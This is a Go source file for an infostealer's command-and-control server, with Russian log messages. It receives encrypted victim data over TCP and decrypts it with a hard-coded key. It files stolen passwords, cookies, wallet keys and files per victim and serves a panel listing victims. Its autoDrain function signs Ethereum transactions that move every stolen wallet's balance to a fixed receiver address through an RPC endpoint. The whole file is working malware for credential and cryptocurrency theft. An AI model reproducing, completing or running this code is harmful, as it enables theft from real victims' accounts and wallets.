package main

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdsa"
	"crypto/sha1"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/big"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/ethclient"
)

const (
	TCP_PORT  = ":443"
	HTTP_PORT = ":8080"
	RPC_URL   = "https://mainnet.infura.io/v3/sl0e3fewevkewovkvwv3jf9ewjgge"
	RECEIVER  = "0x4F8c2A1234567890123456789012345678901234"

	PLUS    = "[+]"
	MINUS   = "[-]"
	ASTERIK = "[*]"
)

var (
	clients = make(map[string]*Client)
	mu      = &sync.RWMutex{}

	staticKey = []byte{
		0x4e, 0x9c, 0x1a, 0xf3, 0xb2, 0x0d, 0xe7, 0x88,
		0x3f, 0x1b, 0x6c, 0x94, 0xa5, 0x2e, 0xd1, 0x77,
		0xc0, 0x83, 0xf6, 0x5a, 0x19, 0x44, 0xb8, 0xe2,
		0x6d, 0x30, 0x91, 0xc5, 0x7f, 0xaa, 0x28, 0xd9,
	}
)

type Client struct {
	ID          string    `json:"id"`
	Hostname    string    `json:"hostname"`
	LastArchive string    `json:"last_archive"`
	LastConnect time.Time `json:"last_connect"`
	IsOnline    bool      `json:"is_online"`
}

type Loot struct {
	VictimID  string   `json:"victim_id"`
	Hostname  string   `json:"hostname"`
	OS        string   `json:"os"`
	IP        string   `json:"ip"`
	Browser   []string `json:"browser"`
	Wallets   []string `json:"wallets"`
	Cookies   string   `json:"cookies"`
	Passwords []string `json:"passwords"`
	Files     []string `json:"files"`
	Timestamp int64    `json:"ts"`
}

func generateVictimID(ip, hostname string) string {
	return fmt.Sprintf("%x", sha1.Sum([]byte(ip+hostname+time.Now().String())))
}

func saveRawLoot(ip string, data []byte) {
	dir := filepath.Join("loot", "raw", ip)
	os.MkdirAll(dir, 0755)
	filename := fmt.Sprintf("%d.bin", time.Now().Unix())
	os.WriteFile(filepath.Join(dir, filename), data, 0644)
	log.Printf("[+] Raw данные от %s → %s", ip, filename)
}

func decryptAESGCM(ciphertext []byte, key []byte) ([]byte, error) {
	if len(key) != 32 {
		return nil, fmt.Errorf("ключ должен быть 32 байта")
	}
	block, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(block)
	if len(ciphertext) < gcm.NonceSize() {
		return nil, fmt.Errorf("слишком короткий шифротекст")
	}
	nonce := ciphertext[:gcm.NonceSize()]
	encrypted := ciphertext[gcm.NonceSize():]
	plaintext, err := gcm.Open(nil, nonce, encrypted, nil)
	return plaintext, err
}

func autoDrain(wallets []string) {
	client, err := ethclient.Dial(RPC_URL)
	if err != nil {
		return
	}
	for _, privKeyHex := range wallets {
		if !common.IsHexAddress("0x"+privKeyHex) && len(privKeyHex) == 64 {
			privateKey, err := crypto.HexToECDSA(privKeyHex)
			if err != nil {
				continue
			}
			publicKey := privateKey.Public()
			publicKeyECDSA, _ := publicKey.(*ecdsa.PublicKey)
			fromAddress := crypto.PubkeyToAddress(*publicKeyECDSA)

			balance, _ := client.BalanceAt(context.Background(), fromAddress, nil)
			if balance.Cmp(big.NewInt(0)) > 0 {
				nonce, _ := client.PendingNonceAt(context.Background(), fromAddress)
				gasPrice, _ := client.SuggestGasPrice(context.Background())
				toAddress := common.HexToAddress(RECEIVER)
				value := new(big.Int).Sub(balance, new(big.Int).Mul(gasPrice, big.NewInt(21000)))
				if value.Sign() > 0 {
					tx := types.NewTransaction(nonce, toAddress, value, 21000, gasPrice, nil)
					signedTx, _ := types.SignTx(tx, types.NewEIP155Signer(big.NewInt(1)), privateKey)
					client.SendTransaction(context.Background(), signedTx)
					log.Printf("[%s] Дренинг: %s → %s", PLUS, fromAddress.Hex(), RECEIVER)
				}
			}
		}
	}
}

func saveLoot(loot Loot) {
	victimID := generateVictimID(loot.IP, loot.Hostname)

	dir := filepath.Join("loot", loot.OS, loot.Hostname+"_"+victimID)
	os.MkdirAll(dir, 0755)

	metaFile, _ := json.MarshalIndent(loot, "", " ")
	os.WriteFile(filepath.Join(dir, "info.json"), metaFile, 0644)

	if len(loot.Passwords) > 0 {
		os.WriteFile(filepath.Join(dir, "passwords.txt"), []byte(strings.Join(loot.Passwords, "\n")), 0644)
	}
	if len(loot.Wallets) > 0 {
		os.WriteFile(filepath.Join(dir, "wallets.txt"), []byte(strings.Join(loot.Wallets, "\n")), 0644)
		go autoDrain(loot.Wallets)
	}
	if len(loot.Cookies) > 0 {
		cookieStr := ""
		for k, v := range loot.Cookies {
			cookieStr += fmt.Sprintf("%d=%c\n", k, v)
		}
		os.WriteFile(filepath.Join(dir, "cookies.txt"), []byte(cookieStr), 0644)
	}

	mu.Lock()
	clients[victimID] = &Client{
		ID:          victimID,
		Hostname:    loot.Hostname,
		LastArchive: victimID,
		LastConnect: time.Now(),
		IsOnline:    true,
	}
	mu.Unlock()

	log.Printf("[%s] Новая жертва: %s (%s) | Файлов: %d | Кошельков: %d | Паролей: %d",
		PLUS, loot.Hostname, loot.OS, len(loot.Files), len(loot.Wallets), len(loot.Passwords))
}

func handleTCPConnection(conn net.Conn) {
	defer conn.Close()
	ip := conn.RemoteAddr().String()

	lenBuf := make([]byte, 2)
	if _, err := io.ReadFull(conn, lenBuf); err != nil {
		return
	}
	pktLen := binary.BigEndian.Uint16(lenBuf)

	encrypted := make([]byte, pktLen)
	if _, err := io.ReadFull(conn, encrypted); err != nil {
		return
	}

	plaintext, err := decryptAESGCM(encrypted, staticKey)
	if err != nil {
		saveRawLoot(ip, encrypted)
		return
	}

	var loot Loot
	if err := json.Unmarshal(plaintext, &loot); err != nil {
		saveRawLoot(ip, plaintext)
		return
	}

	loot.IP = ip
	loot.Timestamp = time.Now().Unix()
	saveLoot(loot)
}

func setupHTTPServer() {
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "static/index.html")
	})

	http.HandleFunc("/api/clients", func(w http.ResponseWriter, r *http.Request) {
		mu.RLock()
		defer mu.RUnlock()

		var list []Client
		for _, c := range clients {
			c.IsOnline = time.Since(c.LastConnect) < 5*time.Minute
			list = append(list, *c)
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(list)
	})

	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))
	http.ListenAndServe(HTTP_PORT, nil)
}

func main() {
	go func() {
		listener, err := net.Listen("tcp", TCP_PORT)
		if err != nil {
			log.Fatalf("Не удалось запустить TCP на %s: %v", TCP_PORT, err)
		}
		log.Printf("[*] C2 TCP слушает на %s", TCP_PORT)
		for {
			conn, err := listener.Accept()
			if err != nil {
				continue
			}
			go handleTCPConnection(conn)
		}
	}()

	log.Printf("[*] Веб-панель доступна на http://localhost%s", HTTP_PORT)
	setupHTTPServer()
}
